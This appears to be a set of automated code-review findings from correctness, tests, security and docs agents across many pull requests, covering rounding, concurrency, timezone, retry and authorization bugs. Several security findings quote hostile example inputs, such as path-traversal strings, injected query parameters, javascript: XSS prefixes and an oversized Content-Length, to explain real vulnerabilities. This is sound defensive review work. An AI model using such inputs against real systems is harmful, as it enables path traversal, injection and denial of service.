test_renders_line_items mocks out format_line and asserts only that it was called twice. This never checks that render() actually incorporates the formatted line items into its output, or that the invoice renders correctly. If render() dropped the formatted results entirely, or concatenated them incorrectly, this test would still pass since it only inspects the mock's call count.

_Also raised by the correctness agent:_ Line-item test asserts only mock call count, not rendered output

findings.title: Failing tie-rounding test deleted with no fix in the diff
findings.body:
The PR is titled "Fix the rounding and drop the failing test", but the only change present is the removal of `test_rounds_half_to_even`, which asserted the banker's-rounding behaviour at the exact .5 tie (`round_cents(Decimal("2.345")) == Decimal("2.34")`). No implementation change is included, so the behaviour the test was guarding is now simply unverified: the remaining `test_rounds_up_above_half` only covers values strictly above the tie and cannot detect a regression in the half-way case, which is exactly where rounding implementations differ (ROUND_HALF_EVEN vs ROUND_HALF_UP). If the rounding logic really was fixed, ship that change alongside and keep the test with the corrected expectation; if it was not, the test should be restored (xfail-marked if it must land red) rather than deleted.

_Also raised by the tests agent:_ Deleted test_rounds_half_to_even instead of fixing it

findings.title: Mock patches wrong target; test calls the real deliver()
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, so the name `deliver` is bound into the `notify.sender` module namespace at import time. Patching `notify.transport.deliver` rebinds the attribute on the transport module only; `send_with_retry` still resolves its module-global `deliver`, which is the original function. This test therefore performs three real calls into the transport on every run, and its assertion passes or fails based on what the real `deliver` returns, not on the mock. Patch `notify.sender.deliver` instead \u2014 exactly as the existing test on line 2 already does \u2014 and consider asserting the call count is 3 so the retry behaviour is actually verified.

_Also raised by the tests agent:_ Patch targets wrong module; test doesn't exercise mocked retry logic

findings.title: csv_rows joins values without calling csv_escape
findings.body:
`csv_rows` builds each line with `",".join(str(r.get(c, "")) for c in columns)` and never passes the values through `csv_escape`, which is defined immediately below it in the same module for exactly this purpose. Any cell containing a comma, a double quote, or a newline will split into extra fields or break quoting on the consumer side, silently corrupting the export. Wrap each value: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. Note also that `csv_escape` does `"," in value`, which raises `TypeError` for non-str input, so the `str(...)` conversion must stay on the caller side (or move into `csv_escape`).

_Also raised by the security agent:_ csv_rows joins values unescaped; csv_escape is never applied

findings.title: New exporter functions ship with no tests
findings.body: This PR adds six new functions (csv_rows, csv_escape, dump_streaming, dump_pretty, margins_for, usable_width) across three files, but no test file is touched. The repository's existing convention (test_csv.py) tests csv_header directly by asserting on its output, so these new functions could regress silently — e.g. csv_escape mishandling quoting, dump_streaming's chunk boundaries being off-by-one, or margins_for/usable_width miscalculating page geometry — and nothing in the suite would fail.

findings.title: dump_streaming requires a sized, sliceable sequence despite its name
findings.body: `dump_streaming` calls `len(rows)` and slices `rows[i : i + chunk_size]`, so it raises `TypeError` for a generator or any lazy iterable — the very input a caller would reasonably hand to a function named "streaming". Either document that `rows` must be a list/sequence, or chunk with `itertools.islice` so a true iterator works. Separately, `chunk_size=0` (or negative) makes `range(0, n, 0)` raise `ValueError`; a guard or documented precondition would be cheap.

findings.title: New test depends on real wall-clock time, unlike sibling test
findings.body:
test_token_issued_today_is_valid() calls issue_token() and datetime.now(timezone.utc) directly, and calls is_expired(token.expires_at) without passing an explicit `now`. The existing test (lines 4-6) deliberately fixes both `issued` and `now` to avoid time dependence. This new test instead relies on the real clock and on token.issued_at/expires_at computed by issue_token() at call time. If issue_token() computes expires_at close to now, or if the test runs across a date boundary (UTC midnight), the date() comparison on line 11 can fail spuriously, and if is_expired() defaults `now` to the actual current time, the assertion on line 12 could pass or fail depending purely on wall-clock timing rather than on token-expiry logic being correct — the PR title itself flags this as the 'flaky' behavior being tested, but the test as written reproduces rather than fixes that flakiness.

_Also raised by the correctness agent:_ Date comparison is flaky across the UTC midnight boundary

findings.title: No test exercises the coupon-expiry rejection branch
findings.body: apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but the only test in tests/test_coupons.py was updated to pass a coupon with expires_at=tomorrow(), which never triggers this branch. If the comparison logic were wrong (e.g. flipped, wrong timezone handling, or exception not raised), nothing in the test suite would fail. Add a test that passes an expired coupon and asserts CouponExpired is raised.

findings.title: expires_at may be None or naive, raising TypeError instead of CouponExpired
findings.body: `coupon.expires_at < datetime.now(timezone.utc)` fails with `TypeError` in two reachable cases: (a) a coupon with no expiry, where `expires_at` is `None` (`'<' not supported between instances of 'NoneType' and 'datetime.datetime'`), and (b) an `expires_at` that is a naive datetime, e.g. loaded from a DB column without timezone (`can't compare offset-naive and offset-aware datetimes`). Both surface as an opaque TypeError from the billing path rather than a clean `CouponExpired` or a successful apply. Guard explicitly: `if coupon.expires_at is not None and coupon.expires_at < now`, and normalise naive values to UTC before comparing.

findings.title: Blocking requests.get inside async coroutine stalls the event loop
findings.body:
`fetch_plan_limits` is declared `async` but its body contains no `await`; it calls `requests.get(...)`, which is fully synchronous. When awaited from an event loop, the loop thread is blocked for the entire duration of the HTTP call \u2014 up to the 5 second timeout, and longer if DNS/connect hangs before the timeout applies \u2014 so every other in-flight request handled by that loop is stalled too. The `async` keyword makes this invisible at the call site: callers see a coroutine and reasonably assume it yields.

Use the same pattern as `fetch_plan` on lines 5-7: take (or construct) an `httpx.AsyncClient` and `await client.get(...)`. If the synchronous client must be kept, wrap it in `await asyncio.to_thread(...)` so the loop is not blocked, and drop the now-unneeded `import requests` if you switch to httpx.

findings.title: Unencoded tenant_id interpolated into internal billing URL path
findings.body:
`fetch_plan_limits` builds the request URL with an f-string: `https://billing.internal/limits/{tenant_id}`. `requests`/`urllib3` do not strip dot-segments or escape reserved characters in a path supplied this way, so a `tenant_id` value such as `../../admin/keys`, `1?admin=true` or `1#` lets the caller reach a different endpoint, inject query parameters, or truncate the path on the internal billing service — a service that is presumably reachable only from this host and may trust it. Note the same pattern exists on the pre-existing line 6, but that call goes through a client with a bounded base URL and is out of scope for this change.

Fix: validate `tenant_id` against the expected shape (e.g. UUID/integer) before use, or at minimum percent-encode it with `urllib.parse.quote(str(tenant_id), safe="")`.

findings.title: New async function with blocking I/O has no test coverage
findings.body: fetch_plan_limits is a new async def that internally calls the synchronous requests.get, which blocks the event loop — exactly the kind of defect this PR's title flags. No test file is present in this diff, so nothing would catch a regression here (e.g. if the URL, timeout, or JSON parsing broke, or if the blocking call caused request pile-up under load). At minimum a test exercising this function's return value against a mocked HTTP response would catch basic contract regressions, though it would not by itself detect the blocking-call issue.

findings.title: Bare except swallows BaseException and logs nothing
findings.body:
`except:` with no exception class catches `BaseException`, which includes `KeyboardInterrupt`, `SystemExit` and `GeneratorExit`. A Ctrl-C or an interpreter shutdown landing inside `_client.send` will be turned into a normal `return None`, so the process will not exit and shutdown/cancellation will appear to succeed. Nothing is logged either, so a permanently broken metrics endpoint is indistinguishable from a healthy one.

Narrow this to the failures you actually intend to tolerate (e.g. `except Exception:`, or better, the client's transport/timeout exception type) and log the exception before returning, e.g. `logger.warning("metrics push failed", exc_info=True)`.

findings.title: No test covers the new non-fatal error handling behavior
findings.body: The change alters push_metrics so that any exception from _client.send is swallowed and None returned instead of propagating. No test exercises the case where _client.send raises, so a regression (e.g. reverting to raising, or the bare except silently hiding a real bug) would not be caught by any existing test suite.

findings.title: Rate limit bypass: check-then-act outside the lock in try_consume
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, compares against `LIMIT` on line 16, then yields to the event loop on line 18 (`await asyncio.sleep(0)`) before writing the new value on line 19 \u2014 all without taking `_lock`, which the existing `consume` correctly holds (line 9).

Two consequences, both attacker-triggerable by simply issuing requests concurrently for the same tenant:

1. **Limit bypass.** N coroutines can all read the same `current` below the limit and all return `True`, admitting up to N\u00d7`cost` beyond `LIMIT`.
2. **Lost updates.** The write is an absolute assignment (`= current + cost`) rather than a read-modify-write under the lock, so concurrent increments \u2014 including those made by `consume` \u2014 are silently discarded. The counter can be driven arbitrarily far below the true usage, so the limiter stays permanently open rather than just overshooting once.

Fix by holding the same lock across the check and the update, and by re-reading inside the critical section:

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

The `await asyncio.sleep(0)` on line 18 should be removed; if some real awaitable belongs there it must not sit between the check and the commit.

_Also raised by the correctness agent:_ try_consume checks and updates counter without holding _lock

findings.title: No test exercises try_consume's concurrency/race behaviour
findings.body: try_consume reads _counters outside the _lock used by consume, then awaits (asyncio.sleep(0)) before writing, creating a check-then-act race between concurrent callers or against consume. There is no test in this diff (or referenced) that runs concurrent calls to try_consume, or try_consume alongside consume, to verify the limit is actually enforced under concurrency. A test that merely calls try_consume sequentially would pass even though the race condition allows the LIMIT to be exceeded under concurrent load.

findings.title: Public function `try_consume` lacks API contract documentation
findings.body: The new `try_consume` function is a public API (not prefixed with `_`) whose behaviour cannot be reliably inferred from its name and parameters. Callers need to know: (1) what return values mean (does `False` mean over-limit or something else?), (2) whether the check-then-act is atomic or if a race exists between the check on line 16 and the write on line 19, and (3) what `cost` represents and acceptable ranges. Without this, callers are likely to misuse it.

findings.title: Docstring describes old tuple return, not new dict
findings.body:
The docstring on line 2 states the function returns `(name, email)` — a tuple — but the implementation on line 6 now returns a dictionary `{"name": ..., "email": ..., "tier": ...}`. This breaks the contract documented for callers. Existing code like `reports/weekly.py` that unpacks the result as a tuple will fail at runtime. Update the docstring to describe the actual return type.

_Also raised by the correctness agent:_ Docstring still promises a (name, email) tuple

findings.title: Return shape change breaks tuple-unpacking caller in reports/weekly.py
findings.body: `lookup_user` now returns `{"name": ..., "email": ..., "tier": ...}` instead of the `(name, email)` tuple it previously returned. The retrieved caller `reports/weekly.py:render_row` does `name, email = lookup_user(user_id)`. Unpacking a 3-key dict into two names raises `ValueError: too many values to unpack (expected 2)` on every call — and even with two keys it would bind the key strings, not the values. Either update all callers (at minimum `render_row`) to index the dict, or return a `NamedTuple`/`dataclass` that stays tuple-unpackable while adding `tier`.

findings.title: Return-shape change to lookup_user has no test covering existing caller
findings.body: lookup_user now returns a dict instead of a (name, email) tuple. The retrieved repository context shows reports/weekly.py calling `name, email = lookup_user(user_id)`, which will raise a ValueError/ TypeError when unpacking a dict (dicts unpack to keys, not the expected two values) after this change. There is no test in this diff that exercises lookup_user's return value against its caller, so this contract break would not be caught by any test suite.

findings.title: WriteSettlement always returns nil, swallowing insert failures
findings.body:
The `err` from `db.Exec` is scoped to the `if` statement on line 15 and is only logged. Lines 18-19 then declare a brand-new `var err error` (always nil) and return it, so `WriteSettlement` can never return a non-nil error from the insert — a failed settlement write looks successful to every caller, which for financial data means silent loss/inconsistency. Compare `WriteEntry` above (lines 7-8), which returns the exec error directly. Fix by returning the exec error:

```go
if _, err := db.Exec(...); err != nil {
    log.Printf("settlement insert failed: %v", err)
    return err
}
return nil
```

_Also raised by the security agent:_ WriteSettlement swallows insert failure and always returns nil

findings.title: No test exercises WriteSettlement's error path
findings.body: WriteSettlement is new and untested. In particular it declares a fresh `var err error` at line 18 and returns that instead of the error from db.Exec at line 15, so the function always returns nil even when the insert fails. No test exists to catch this: a test asserting that WriteSettlement returns an error when the underlying db.Exec fails would fail today and immediately surface the bug. Without such a test, this behaviour can silently regress or persist unnoticed.

findings.title: Mutable default `attempted=[]` accumulates across all calls
findings.body:
`attempted=[]` is evaluated once at function-definition time, so the same list object is shared by every call that omits the argument. Line 10 appends to it and line 11 returns it, so the second call returns its own failures plus every failure from all previous calls, and a caller that mutates the returned list corrupts the default for future calls. Use the sentinel pattern already used two lines above: `def send_with_retries(recipients, attempted=None):` then `attempted = list(attempted or [])` (or `[] if attempted is None else attempted`).

_Also raised by the security agent:_ Mutable default list leaks recipients across calls and grows unbounded

findings.title: Public function contract is unclear and dangerous default not documented
findings.body: `send_with_retries` is a public function whose name and signature do not make its contract clear. The function takes a mutable default argument (`attempted=[]`) that accumulates state across calls—a dangerous pattern that will surprise callers. This behavior needs to be explicitly documented, as a caller reading the signature alone would not understand that the default list mutates and persists between invocations. Additionally, the function's purpose (collect failed recipients? retry logic?) is not apparent from its name alone.

findings.title: No test covers mutable default arg causing state to leak across calls
findings.body: send_with_retries uses attempted=[] as a default argument, which is shared across all calls that don't pass their own list — failed recipients from one call will accumulate and appear in the result of subsequent calls. No test exercises this function at all, so this bug (and any future regression in retry behavior) would go undetected. A test calling send_with_retries twice and asserting the second call's result doesn't contain leftovers from the first would catch this.

findings.title: Rounding boundary silently changed from >= 0.5 to > 0.5
findings.body:
Every other function in this diff is a pure rename, but `compute_rounding` also changes the comparison operator: the old body was `return 1 if line.remainder_cents >= 0.5 else 0`, the new one is `return 1 if line.remainder_cents > 0.5 else 0`. For the exact boundary value `remainder_cents == 0.5` the function now returns 0 where it previously returned 1 — i.e. an exact half-cent remainder rounds down instead of up. Half-cent remainders are the common case for any amount split or percentage that lands on a half, so this is not a rare input; it changes billed totals by one cent per affected line.

If the round-half-up behaviour was intended to change, it needs to be its own change with a test and a note; if not, restore `>=`.

_Also raised by the security agent:_ Rounding comparison silently changed from >= to > in a rename-only PR

findings.title: Rounding boundary change (>=0.5 to >0.5) has no test to catch it
findings.body: Under the guise of a mechanical rename, compute_rounding changed its comparison from `>= 0.5` to `> 0.5`, which flips behavior exactly at the boundary value 0.5 (previously rounded up, now rounds down). No test file is present in this diff, so nothing would fail if this boundary change is wrong — it would silently ship as part of what looks like a no-op rename.

findings.title: Off-by-one slice in page_of_sorted drops one record per page
findings.body: `ordered[start : start + PAGE_SIZE - 1]` returns only `PAGE_SIZE - 1` items per page, while `start` still advances by a full `PAGE_SIZE` per page. The record at index `start + PAGE_SIZE - 1` is therefore never returned by any page — for every page boundary one record silently disappears from the export, and a caller that pages until it sees a short page will also terminate early or loop incorrectly since every page is short. Change the bound to `ordered[start : start + PAGE_SIZE]` to match `page_of` on line 6.

findings.title: No test covers page_of_sorted, which drops the last item per page
findings.body: page_of_sorted slices `ordered[start : start + PAGE_SIZE - 1]`, one element short of a full page, unlike `page_of` which correctly uses `start + PAGE_SIZE`. No test in this diff exercises this function, so this off-by-one would slip through silently. A test asserting the returned page length equals PAGE_SIZE (or contains the expected last record) would catch this.

findings.title: Removed None guard makes header_lines crash for invoices without a PO
findings.body:
`invoice.purchase_order` is declared `str | None` and the model docstring states it is only set for customers on invoicing terms (~1 account in 20). The rewritten list literal calls `.upper()` on it unconditionally, so `header_lines` raises `AttributeError: 'NoneType' object has no attribute 'upper'` for the overwhelming majority of invoices.

Restore the conditional append, or build the list and only add the PO line when `invoice.purchase_order is not None` (e.g. `*( [f"PO {invoice.purchase_order.upper()}"] if invoice.purchase_order else [] )`).

Note also the return-shape change: callers that previously received a one-element list for PO-less invoices now always get two elements, so any caller indexing or length-checking the result is affected even once the crash is fixed.

_Also raised by the docs agent:_ Function now requires non-null purchase_order without documenting it

findings.title: No test covers header_lines with a None purchase_order
findings.body: The removed guard (`if invoice.purchase_order is not None`) previously handled invoices without a purchase order, which per models/invoice.py is the common case (~19/20 accounts). The new code unconditionally calls `.upper()` on `invoice.purchase_order`, which will raise AttributeError for None. No test in this diff exercises header_lines with invoice.purchase_order set to None, so this behavior change would go undetected until it hits production for the majority of invoices.

findings.title: File handle leaks on early return and exception paths
findings.body:
`fh = open(path)` is only closed on the single success path at line 16. When `header != expected_header` the function returns at line 14 with the handle still open, and any exception raised between lines 11 and 15 (e.g. `csv.Error` on a malformed line, `UnicodeDecodeError`, or `StopIteration` from `next(reader)` on an empty file) also escapes without closing. Under CPython refcounting the handle usually gets collected eventually, but this is non-deterministic and leaks descriptors under PyPy or when the object is captured in a traceback. Use the same pattern as `read_rows` directly above:

```python
def read_validated(path, expected_header):
    with open(path) as fh:
        reader = csv.reader(fh)
        ...
```

_Also raised by the security agent:_ File handle leaked when header validation fails

findings.title: New read_validated function has no tests, including leak-prone early return
findings.body: read_validated is new, untested logic with a branch: on header mismatch it returns None on line 14 without closing fh, leaking the file handle. Nothing in this diff exercises either the success path or the mismatch path, so a fix or a regression on the close-on-mismatch behavior would go unnoticed.

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`charge_card` retries `gateway.charge()` up to 3 times, but `charge()` is documented as "NOT idempotent: each call creates a new charge." Any failure that occurs after the gateway has already accepted the POST — a timeout, a dropped connection, a 5xx returned after commit — will cause the retry decorator to issue a second (and third) `/charges` request, creating 2–3 real charges for one logical payment. Money is moved, so this is not recoverable by simply erroring out.

The gateway docstring names the fix: it "supports an Idempotency-Key header; pass one to make retries safe." Generate a stable key per logical payment *outside* the retried function (so it is identical across attempts) and pass it through to `charge()`. Until an idempotency key is threaded through, `charge()` should not be retried at all — drop the decorator, or restrict retries to errors that are provably pre-transmission.

Note the contrast with `fetch_charge` above: `get_charge` is explicitly "Safe to repeat," which is why the existing retry there is correct and this one is not.

_Also raised by the security agent:_ Retrying non-idempotent charge() can double-charge customers

findings.title: Unsafe retry of non-idempotent gateway call
findings.body: The `charge_card()` function retries calls to `charge()`, which the gateway documentation explicitly marks as NOT idempotent: "each call creates a new charge." Without an Idempotency-Key header, retries will create duplicate charges. The docstring should warn callers of this risk, or the implementation should pass an Idempotency-Key to the gateway.

findings.title: New retrying wrapper around non-idempotent charge() is untested
findings.body: `charge_card` retries `charge()`, which per billing/gateway.py's own docstring is NOT idempotent and creates a new charge on every call unless an Idempotency-Key is passed. No Idempotency-Key is used here, so a transient failure after the gateway processed the charge would cause `@retry` to re-submit and create a duplicate charge. There is no test in this diff verifying retry behavior for this function, and none would catch this duplicate-charge scenario (e.g. simulating a failure that occurs after the charge succeeded server-side but the client sees an error).

findings.title: Naive datetime.now() subtracted from tz-aware expires_at raises TypeError
findings.body: `cutoff` is built from `datetime.now()` with no tzinfo, while `invite.expires_at` is documented as always timezone-aware UTC. Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so `expires_within` fails for every input, not just edge cases. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does; that also removes the silent wrong-answer risk of comparing local wall-clock time against UTC on any non-UTC host.

findings.title: Timezone-aware datetime compared with naive datetime
findings.body: The new `expires_within` function subtracts `cutoff` (a timezone-naive datetime from `datetime.now()`) from `invite.expires_at` (documented as timezone-aware UTC). This violates the explicit contract in `models/invite.py` that `expires_at` is always timezone-aware. In Python, subtracting a naive datetime from an aware datetime raises TypeError at runtime. Either use `datetime.now(timezone.utc)` (consistent with `is_expired` on line 5) or document that this function requires timezone-naive invites.

Subtracting a naive datetime from an aware one raises TypeError at runtime. No test file is included in this diff, so nothing would exercise this function and catch the resulting crash or logic error.

findings.title: contactEmail dereferences optional billingContact without a guard
findings.body:
`Account.billingContact` is declared optional (`billingContact?`) and documented as "Absent until the customer completes onboarding." `contactEmail` accesses `.email` on it directly, so for any pre-onboarding account this throws `TypeError: Cannot read properties of undefined (reading 'email')` at runtime. The sibling function `bannerFor` on line 4 handles exactly this case with `?.` plus a `??` default, so the omission here looks accidental rather than an invariant the caller is expected to uphold. Either mirror that pattern (`return account.billingContact?.email.toLowerCase() ?? "";` or return `string | undefined`), or narrow the parameter type so the compiler enforces that a billing contact is present. Note that if strict null checks are enabled this will also fail to compile, which suggests the file may be built without `strictNullChecks`.

_Also raised by the security agent:_ contactEmail dereferences optional billingContact without a guard

findings.title: Public function contract contradicts Account type
findings.body: The `contactEmail` function calls `.email` on `account.billingContact` without null-checking, but the `Account` interface marks `billingContact` as optional (`billingContact?: ...`) with a comment stating it is "Absent until the customer completes onboarding." A caller passing an account in pre-onboarding state will get a runtime error. The function needs either a docstring explaining the precondition (that `billingContact` must exist) or defensive code that handles the absent case.

Since billingContact is optional per types.ts, calling contactEmail on an account without a billing contact will throw a TypeError. There is no test exercising this new function at all, let alone the missing-contact case, so this defect would ship silently.

findings.title: Timeout value contradicts fetch() contract (milliseconds vs seconds)
findings.body:
The new function `sync_partner_catalogue()` calls `fetch()` with `timeout=30`, but `fetch()` expects timeout in milliseconds (as documented: "timeout is in MILLISECONDS, matching the underlying transport. Callers wanting seconds must multiply."). This means the timeout will be 30ms rather than the intended ~30 seconds, which will almost certainly cause the fetch to fail prematurely. Either multiply by 1000 (`timeout=30000`) or add a clarifying comment explaining why 30ms is appropriate.

_Also raised by the correctness agent:_ timeout=30 is 30 milliseconds, not 30 seconds

findings.title: New sync_partner_catalogue has no test covering the timeout units bug
findings.body: sync_partner_catalogue passes timeout=30 to fetch(), whose docstring states timeout is in milliseconds. If the intent was 30 seconds (as the PR description 'timeout set generously' suggests), this is effectively a 30ms timeout — the opposite of generous. No test exercises this function or asserts the value/units passed to fetch, so this defect would ship silently.

findings.title: Index duplicates existing invoices_tenant_created_idx from 0007
findings.body:
`invoices_tenant_recent_idx` is defined on `invoices (tenant_id, created_at DESC)` \u2014 exactly the columns, order and sort direction of `invoices_tenant_created_idx`, created in migrations/0007_invoice_indexes.sql and already applied on 2025-11-02. The planner will never need both; the duplicate just doubles the write amplification and storage on the invoices table, and the CONCURRENTLY build will consume a full table scan to produce it.

`IF NOT EXISTS` does not protect against this: Postgres matches on the index *name*, not the definition, and the names differ. So the statement will happily create the redundant index rather than becoming a no-op.

If the intent was to rename or replace the 0007 index, drop it explicitly; otherwise the reporting query is already covered and this statement should be removed.

findings.title: Auth token leaked to logs: Referer scrubbing removed
findings.body:
Previously the `Referer` header was passed through `_scrub_uri(value, extra_param_keys)` before being added to the logged header dict; the new code writes `request.headers[header]` verbatim for every header in the list, including `Referer`. The retrieved context shows `token_authenticated_url` builds notebook URLs as `f"{base}?token={token}"`, and its own docstring states "the browser sends the token back in the Referer header on every subresource request". Every subresource request on a token-authenticated session will therefore write a live session token into the server log at whatever level `log_method` corresponds to (this path appears to be the 5xx branch, which an attacker can often provoke deliberately).

Anyone who can read the logs \u2014 operators, log-shipping pipelines, sidecar collectors, crash reports, or anyone who obtains a log file \u2014 gains full authenticated access to the notebook server, which means arbitrary code execution as the notebook user.

Restore the scrub: keep the per-header branch that runs `_scrub_uri` on `Referer` (and consider applying it to any other URL-bearing header before logging). If the goal was to add headers to the 5xx log, add them to the list while preserving the sanitisation step.

_Also raised by the correctness agent:_ Referer header now logged unscrubbed, leaking auth tokens into logs

findings.title: No test guards against Referer token leaking into logs
findings.body: The change removes the call to _scrub_uri for the Referer header before logging, so a token embedded in the Referer (per token_authenticated_url) will now be written verbatim to logs on 5xx responses. If there is no existing test asserting that logged Referer values are scrubbed of the token query parameter, this regression would go undetected by the test suite.

findings.title: Dropping 'xlinkhref' lets javascript: URLs bypass link validation
findings.body:
Line 6 narrows the URL-bearing attribute check to `href` and `src`. Any prop named `xlinkhref` now falls through this branch and is never passed to `isAnchorLinkAllowed`, so it is never tested against `unsafeLinkPrefix` (`javascript:`, `data:text/html`, `vbscript:`).

`xlink:href` is a live navigation/loading attribute on SVG elements (`<a xlink:href="javascript:...">`, `<use xlink:href=...>`), and the file header states this markdown includes end-user-submitted content and that `validateProp` is the only barrier before the DOM. The result is a reachable stored-XSS path for any author who can emit an SVG anchor.

If the intent was to drop a dead branch because props are normalised differently now (e.g. `xlink:href` or `xlinkHref` rather than `xlinkhref`), the fix is to correct the key or normalise before comparison — not to remove the check. Suggest restoring the clause, and preferably matching case/punctuation-insensitively on any attribute ending in `href` or `src`.

_Also raised by the security agent:_ Removing xlinkhref from the URL check re-enables javascript: XSS via SVG

findings.title: Removed xlinkhref check has no accompanying test change
findings.body: This change removes 'xlinkhref' from the attribute check in validateProp, meaning attacker-supplied xlink:href attributes with javascript:/data:text/html/vbscript: URIs would no longer be validated by isAnchorLinkAllowed and could pass through unsanitized. No test file is part of this diff, so if there was previously a test asserting xlink:href sanitization, it is not shown being removed or updated — and if no such test exists, this security-relevant behavior change has zero test coverage either way.

findings.title: Unvalidated project query param reaches filesystem path construction
findings.body:
`query.GetProjectQueryParam()` is now passed downstream with no validation at all — the `common.ValidateID` call was the only check on it in this path. The file-backed DAO's `buildPath` joins the project name straight into a path under the storage root and its doc comment states it does no validation of its own because "callers are required to have validated the names before this point." With the check removed, a value such as `..%2f..%2fetc` survives to `filepath.Join(d.Folder, project, kind)` and escapes the storage root, so the list endpoint can be pointed at directories outside the intended project tree.

Restore the `common.ValidateID(projectQueryParameter)` check before the value is used, or, if validation is genuinely meant to move, add it at the DAO boundary and update `buildPath`'s contract comment accordingly. Note the remaining equality check on line 4 does not help: it only runs when a path project is also supplied, and it compares rather than validates.

_Also raised by the security agent:_ Project query parameter no longer validated before reaching path construction

findings.title: No test guards against removal of project ID validation
findings.body: The removed call to common.ValidateID(projectQueryParameter) was the only check preventing an unvalidated project name from flowing into buildPath (which explicitly documents that it does no validation and relies on callers). No test in this diff exercises list() with a malformed/path-traversal-style project query parameter to confirm it is rejected, so this behavior change — allowing invalid project names through — would not be caught by any test run.

findings.title: Buffer pre-reserved from client-declared contentLength (memory exhaustion)
findings.body:
`rw := multipart.NewRW().Reserve(contentLength)` allocates based on a length the client declares, before a single byte of `body` has been read. Previously the RW grew "a page at a time as the body is read", so memory consumed was bounded by bytes actually delivered. Now a request that advertises a huge part size (e.g. `Content-Length: 50000000000` on an S3 UploadPart) reserves that memory immediately even if the connection then sends nothing or is torn down; a handful of concurrent such requests can OOM the server.

If the pre-reservation is worth keeping for the common case, clamp it: reserve `min(contentLength, someMaxPartSize)` (S3 caps a part at 5 GiB, and this server likely has its own upload limit), reject non-positive or over-limit `contentLength` before allocating, and let the RW grow beyond the reservation if more data actually arrives.

_Also raised by the correctness agent:_ contentLength flows unvalidated into buffer pre-reservation

findings.title: No test covers buffer pre-reservation against declared length
findings.body: The change adds `Reserve(contentLength)` to pre-allocate the multipart buffer based on the client-declared Content-Length. This is presumably meant to fix or guard against a CVE involving declared-length allocation (e.g. oversized/mismatched length causing unbounded allocation or a mismatch between declared and actual body size). No test in this diff exercises the case where `contentLength` is large, negative, or does not match the actual bytes read from `body`. If the reservation logic were wrong (e.g. failed to cap allocation, or broke correctness when body is shorter/longer than declared), nothing would fail.

findings.title: Comment no longer describes buffer growth behavior
findings.body: The comment states the RW is used to buffer the part and stream it, but the deleted sentence 'The RW grows a page at a time as the body is read' described the original incremental growth behavior. With the `.Reserve(contentLength)` call added on line 6, the buffer is now pre-allocated rather than growing incrementally. The comment should be updated to reflect this new behavior, or the sentence should be restored with corrections.

findings.title: Refactor inverts default: S3 requests now use plaintext HTTP
findings.body:
The original expression `"http" if request.meta.get("is_secure") is False else "https"` selects HTTP **only** when a caller explicitly sets `is_secure=False`; every other case — including the overwhelmingly common one where `is_secure` is not present in `request.meta` at all and `.get()` returns `None` — yields `https`. The new expression `"https" if request.meta.get("is_secure") else "http"` treats a missing key as falsy and therefore returns `http`.

Consequence: any request that does not opt in explicitly is built as `http://<bucket>.s3.amazonaws.com/...` on line 6, sending the request (and its AWS signature/credentials in headers or query string) over an unencrypted channel. That is both a behavioural contract break for every existing caller of this handler and a credential-exposure regression.

If the goal is just to simplify, preserve the default explicitly, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"` (unchanged), or `scheme = "https" if request.meta.get("is_secure", True) else "http"`. Note the second form also changes behaviour for non-boolean truthy/falsy values (e.g. `0`, `""`), which the original `is False` check deliberately ignored.

findings.title: S3 handler defaults to plaintext HTTP, disabling TLS by default
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` is fail-secure: TLS is used unless the caller explicitly sets `is_secure=False`. The new expression `"https" if request.meta.get("is_secure") else "http"` is fail-open: when `is_secure` is absent from `request.meta` (the common case — `dict.get` returns `None`, which is falsy) or is any falsy value, the URL built on line 6 becomes `http://<bucket>.s3.amazonaws.com/...`.

Every S3 request carries AWS signature material in its headers (Authorization / signed query parameters) plus the object contents in the response. Sending these over cleartext exposes the credentials and the retrieved data to any on-path observer, and allows an on-path attacker to tamper with the response body that Scrapy then parses. This is a transport-security control being switched off by default rather than a bug within the control.

Restore the fail-secure form: only fall back to `http` when the caller has explicitly opted out, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`.

findings.title: No test covers the changed default-scheme logic
findings.body: The logic for choosing http vs https based on request.meta.get('is_secure') was changed so that the default (when the key is absent) is now 'http' instead of 'https'. This is a behavior change with security implications (plaintext by default). No test in this diff exercises download_request with is_secure unset, True, or False to confirm the resulting scheme and URL. If this logic were wrong (e.g., reversed the conditional), nothing in the current change would fail.

findings.title: DELETE requests now authorize as "push", bypassing delete permission
findings.body:
The removed `switch` mapped `http.MethodDelete` to the `delete` action; the replacement only distinguishes GET/HEAD from everything else, so `DELETE` falls into the `else` branch and yields `action = "push"`. The resulting `ResourceAction{Name: name, Action: action}` is what the authorization layer checks, so a principal granted only `push` on a repository can now issue `DELETE /v2/<name>/manifests/<ref>` and have it approved — destroying tags/blobs it has no delete grant for. Conversely, accounts granted `delete` but not `push` lose access, which will also break working deployments.

Restore an explicit `case http.MethodDelete: action = "delete"` branch (or an equivalent `if m == http.MethodDelete`) before falling through to `push`.

Entry point: the HTTP request method, fully attacker-controlled. Sink: the `ResourceAction.Action` value consumed by the access-control check.

_Also raised by the correctness agent:_ DELETE requests are now authorized as "push", dropping the delete check

findings.title: No test catches DELETE now being mapped to 'push' action
findings.body: The change removes the distinct 'delete' action and maps http.MethodDelete to 'push' (since it's neither GET nor HEAD). Per the repository's own documented access model (pkg/api/config/config.go), pull/push/delete are supposed to be distinct so an account can be granted push without delete rights. This change silently merges delete into push, meaning an account with only push permission would now be able to delete repository tags. No test in this diff exercises a DELETE request and asserts the resulting action, so this authorization regression would pass unnoticed if it shipped.

findings.title: DELETE requests now map to 'push' instead of 'delete' action
